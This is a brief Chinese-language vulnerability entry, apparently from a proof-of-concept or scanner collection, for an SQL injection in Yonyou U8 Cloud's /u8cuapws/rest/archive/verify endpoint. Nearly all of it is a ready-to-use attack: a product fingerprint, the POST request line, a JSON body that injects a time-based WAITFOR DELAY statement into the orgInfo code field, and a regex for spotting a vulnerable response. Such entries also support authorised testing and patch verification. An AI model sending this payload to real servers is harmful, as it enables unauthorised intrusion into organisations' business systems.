# 用友U8CloudU8cuapwsSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`"用友U8 Cloud"`
- **请求**：`POST /u8cuapws/rest/archive/verify HTTP/1.1`

**Payload**
```
{"orgInfo":{"code":"1';WAITFOR DELAY '0:0:5'--"}}
```
- **响应特征**：200 ^(?=.*?code)(?=.*?success).*?$